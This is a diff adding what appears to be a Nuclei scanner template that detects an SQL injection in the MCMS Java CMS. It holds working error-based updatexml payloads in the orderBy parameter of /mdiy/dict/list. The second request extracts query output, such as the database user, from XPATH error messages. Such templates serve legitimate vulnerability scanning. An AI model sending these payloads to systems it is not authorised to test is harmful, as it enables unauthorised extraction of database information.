@@ -1,0 +1,49 @@
+id: mcms-sql-injection
+info:
+  name: MCMS SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    MCMS is a full open source Java CMS! Based on SpringBoot 2 architecture, the front-end is based on VUE and Element UI.
+    This template detects an SQL injection vulnerability in MCMS, through which attackers can obtain database sensitive information.
+  reference:
+    - https://gitee.com/mingSoft/MCMS
+  classification:
+    cvss-score: 8
+    cwe-id: CWE-89
+  tags: sql, injection
+
+variables:
+  sql: "user()"
+
+http:
+  - raw:
+      - |
+        GET /mdiy/dict/list?dict=c&dictType=%E6%96%87%E7%AB%A0%E5%B1%9E%E6%80%A7&orderBy=0%20or%20updatexml(1,concat(0x7e,(SELECT%20md5(233)),0x7e),1) HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "e165421110ba03099a1c0393373c5b4"
+      - type: word
+        words:
+          - "text/html"
+
+  - raw:
+      - |
+        GET /mdiy/dict/list?dict=c&dictType=%E6%96%87%E7%AB%A0%E5%B1%9E%E6%80%A7&orderBy=0%20or%20updatexml(1,concat(0x7e,(SELECT%20{{sql}}),0x7e),1) HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "XPATH syntax error"
+    extractors:
+      - type: regex
+        name: extracted-output
+        group: 1
+        regex:
+          - "XPATH syntax error: '~(.*?)~"
